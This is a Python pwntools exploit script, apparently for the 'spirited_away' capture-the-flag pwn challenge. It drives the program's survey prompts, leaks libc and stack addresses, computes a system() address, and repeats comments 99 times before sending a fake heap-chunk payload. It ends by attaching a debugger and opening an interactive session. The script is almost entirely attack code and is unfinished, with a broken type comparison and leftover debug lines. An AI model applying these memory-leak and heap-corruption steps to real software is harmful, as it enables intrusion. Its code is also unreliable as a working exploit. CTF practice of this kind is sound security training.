from pwn import *

r = process("./spirited_away")

def survey(comment,movie):
	name ="a"*10
	age = str(15)
	#movie = "c"*20
	#comment = "ddddddd"
	r.sendlineafter("\nPlease enter your name: ",name)
	r.sendlineafter("Please enter your age: ",age)
	r.sendlineafter("Why did you came to see this movie? ",movie)
	r.sendlineafter("Please enter your comment: ",comment)


survey("ddddddd","c"*20)
#getting libc leak
print(r.recvuntil("Age: "))
print(r.recvline())
#eak = int(.strip())
#print(hex(leak & (2**32-1)))
#system = leak - 0x177fc0
#print(hex(system & (2**32-1)))
print(r.recvuntil("Reason: "))
print(r.recvline())
l = r.recvline().strip()
leak1 = u32(l[3:8])
system = leak1 - 0x2d437

print(r.sendlineafter("Would you like to leave another comment? <y/n>: ",'Y'))
survey("dddddddd",'c'*56)
print(r.recvuntil("Age: "))
print(r.recvline())

print(r.recvuntil("Reason: "))
print(r.recvline())
print(r.recvline())
print(r.recvline())

leak1 = r.recvline().strip()

for i in range(99):
	print(r.sendlineafter("Would you like to leave another comment? <y/n>: ",'Y'))
	survey("ddddddd", "c"*20)
#print(r.sendlineafter("Would you like to leave another comment? <y/n>: ",'Y'))
#getting libc leaak
print(l.encode("hex"))
print("System {}".format(hex(system)))
print(leak1.encode("hex"))

print(r.recvuntil("Reason: "))
print(r.recvline())
print(r.recvline())
print(r.recvline())
print(r.recvline())
#print(r.recvline().strip()[:3].encode("hex"))
stack_leak = u32("\x00"+r.recvline().strip()[:3])
if(hex(stack_leak) == 0x63636300):
	print("Tobias")
	stack_leak = u32("\x00"+r.recvline().strip()[:3])

print("Stack {}".format(hex(stack_leak)))

print(r.sendlineafter("Would you like to leave another comment? <y/n>: ",'Y'))
#fake_chunk = p64()
reason = 'l'*4 + p64(0)+p64(0x41)+ 'g'*0x3c + p64(0) + p64(0x21) 
comment = 'm'*80
survey(comment,reason)




gdb.attach(r)#,'b * 0x0804878a')



r.interactive()

#0xffe1cb08